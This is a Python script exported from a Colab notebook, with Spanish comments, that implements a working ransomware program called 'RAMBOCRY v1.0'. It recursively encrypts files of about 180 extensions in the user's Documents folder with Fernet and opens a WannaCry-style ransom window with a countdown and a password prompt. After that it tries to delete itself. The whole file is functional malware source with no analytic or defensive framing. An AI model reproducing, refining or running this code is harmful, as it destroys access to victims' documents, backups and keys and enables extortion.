# -*- coding: utf-8 -*-
"""Untitled26.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/17yqNUaQNm9uxLQvOFtFFUBMQ5kbWCeA3
"""

import os
import sys
import time
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet

# === CONFIGURACIÓN ===
EXTENSIONES = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv',
    '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot',
    '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot', '.pps',
    '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.vdi',
    '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar',
    '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef', '.psd', '.ai',
    '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf',
    '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', '.jar', '.java', '.rb', '.asp',
    '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h',
    '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db',
    '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop',
    '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds',
    '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der'
]

TIMER_MINUTOS = 30
ARCHIVO_CLAVE = "key.key"
CONTRASENA = ""  # Se reemplaza al desencriptar

# === GENERAR CLAVE AES Y GUARDAR ===
def generar_clave():
    clave = Fernet.generate_key()
    with open(ARCHIVO_CLAVE, 'wb') as f:
        f.write(clave)
    return clave

def cargar_clave():
    return open(ARCHIVO_CLAVE, 'rb').read()

# === CIFRAR ARCHIVOS ===
def cifrar_archivos(ruta, fernet):
    for carpeta, _, archivos in os.walk(ruta):
        for archivo in archivos:
            if any(archivo.endswith(ext) for ext in EXTENSIONES):
                archivo_path = os.path.join(carpeta, archivo)
                try:
                    with open(archivo_path, 'rb') as f:
                        datos = f.read()
                    datos_cifrados = fernet.encrypt(datos)
                    with open(archivo_path, 'wb') as f:
                        f.write(datos_cifrados)
                except:
                    pass  # Para evitar errores en archivos abiertos

# === DESENCRIPTAR ARCHIVOS ===
def desencriptar_archivos(ruta, fernet):
    for carpeta, _, archivos in os.walk(ruta):
        for archivo in archivos:
            if any(archivo.endswith(ext) for ext in EXTENSIONES):
                archivo_path = os.path.join(carpeta, archivo)
                try:
                    with open(archivo_path, 'rb') as f:
                        datos = f.read()
                    datos_descifrados = fernet.decrypt(datos)
                    with open(archivo_path, 'wb') as f:
                        f.write(datos_descifrados)
                except:
                    pass

# === INTERFAZ TIPO WANNACRY ===
def ventana_rescate(clave_real):
    def contar_regresivo():
        tiempo = TIMER_MINUTOS * 60
        while tiempo > 0:
            mins, segs = divmod(tiempo, 60)
            tiempo_label.config(text=f"Tiempo restante: {mins:02d}:{segs:02d}")
            ventana.update()
            time.sleep(1)
            tiempo -= 1
        ventana.destroy()

    def verificar_contrasena():
        entrada = entrada_contrasena.get()
        if entrada == clave_real.decode():
            desencriptar_archivos(ruta_documentos, Fernet(clave_real))
            messagebox.showinfo("Éxito", "¡Archivos restaurados!")
            ventana.destroy()
        else:
            messagebox.showerror("Error", "Contraseña incorrecta")

    ventana = tk.Tk()
    ventana.title("RAMBOCRY v1.0")
    ventana.geometry("400x250")
    ventana.resizable(False, False)

    texto = tk.Label(ventana, text="Tus archivos han sido cifrados.\nPara restaurarlos, ingresa la contraseña correcta.", font=("Arial", 12))
    texto.pack(pady=10)

    entrada_contrasena = tk.Entry(ventana, show="*", width=30)
    entrada_contrasena.pack(pady=10)

    boton = tk.Button(ventana, text="Desbloquear", command=verificar_contrasena)
    boton.pack(pady=5)

    tiempo_label = tk.Label(ventana, text="")
    tiempo_label.pack(pady=10)

    ventana.after(100, contar_regresivo)
    ventana.mainloop()

# === INICIO DEL PROCESO ===
# Obtener ruta del usuario actual
ruta_documentos = os.path.join(os.environ['USERPROFILE'], 'Documents')

# Generar o cargar clave
if not os.path.exists(ARCHIVO_CLAVE):
    clave = generar_clave()
    cifrar_archivos(ruta_documentos, Fernet(clave))
else:
    clave = cargar_clave()

# Mostrar ventana de rescate
ventana_rescate(clave)

# Borrar el script después de ejecución
try:
    os.remove(sys.argv[0])
except:
    pass